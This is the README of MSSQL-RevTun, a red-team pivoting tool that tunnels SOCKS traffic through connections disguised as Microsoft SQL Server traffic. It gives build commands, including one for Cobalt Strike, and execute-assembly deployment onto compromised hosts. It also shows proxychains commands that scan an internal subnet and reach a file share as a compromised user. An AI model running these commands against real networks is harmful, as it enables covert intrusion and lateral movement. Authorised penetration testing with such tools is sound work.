# MSSQL-RevTun

MSSQL-RevTun is a tool for network pivoting. It operates similar to chisel, ligolo and ssh tunneling. The main difference is that it uses the Microsoft SQL Server TDS protocol to make the network traffic look like MSSQL traffic.

It operates in 3 modes:
- **Server**: Listens on a port (1433 by default). Once it receives a client connection, it opens another port (1080 by default). Through the second port, we can use proxychains/tun2socks to forward all traffic though the client.
- **Client**: Connects to server or to the relay using authentic MSSQL authentication. Forwards all traffic from the server.
- **Relay**: Relays the traffic from the client to the server. Use case: the client cannot directly reach the external server but can reach the relay machine.

## Building

### Quick Build
```powershell
.\build-multi.ps1  # Builds .NET Framework 4.8, Linux x64, Windows x64
```

### Manual Builds
```bash
# Windows x64
dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true

# Linux x64  
dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:PublishSingleFile=true

# Cobalt Strike (.NET Framework 4.8)
dotnet build -c Release -f net48 -p:Platform=AnyCPU
```

## Usage

### Server
```bash
./revtun server --password test123
```

### Client 
```bash
./revtun client --host target-server.com --password test123
```

### Relay (Traffic Forwarding)
```bash
./revtun relay --host target-server.com --debug
```

### Using SOCKS Proxy
```bash
proxychains nmap -sT 192.168.1.0/24
proxychains smbclient -U compromised_user //target.internal.fileserver/Share
```

## C2 Integration (e.g. execute-assembly from Cobalt Strike)

### Deployment
```bash
# Client from internal network  
execute-assembly revtun.exe client --host [internal-compromised-host/external-sql-server] --password test123

# Relay on pivot host
execute-assembly revtun.exe relay --host [external-sql-server] 
```

## Command Options
```
SERVER OPTIONS:
  --port, -p <port>          MSSQL server port (default: 1433)
  --proxy-port <port>        Proxy listener port (default: 1080)
  --bind <address>           Bind address (default: 0.0.0.0)
  --verbose, -v              Enable verbose logging
  --require-encryption       Require TLS encryption for all connections
  --no-encryption            Disable TLS encryption support

CLIENT OPTIONS:
  --host, -h <hostname>      Server hostname (default: localhost)
  --port, -p <port>          Server port (default: 1433)
  --username, -u <user>      SQL username (default: sa)
  --password <pass>          Password for authentication (REQUIRED)
  --database, -d <db>        Database name (default: master)
  --auto-exit                Exit after connection test
  --verbose, -v              Enable verbose logging
  --debug                    Enable debug output (shows all messages)
  --encrypt                  Request TLS encryption (default: enabled)
  --no-encrypt               Disable TLS encryption
  --require-encryption       Require TLS encryption (fail if not supported)

RELAY OPTIONS:
  --port, -p <port>          Relay listener port (default: 1433)
  --bind <address>           Bind address (default: 0.0.0.0)
  --host, -h <hostname>      Target server hostname (default: localhost)
  --server-port <port>       Target server port (default: 1433)
  --verbose, -v              Enable verbose logging
  --debug                    Enable debug output (shows TDS packet details)
```
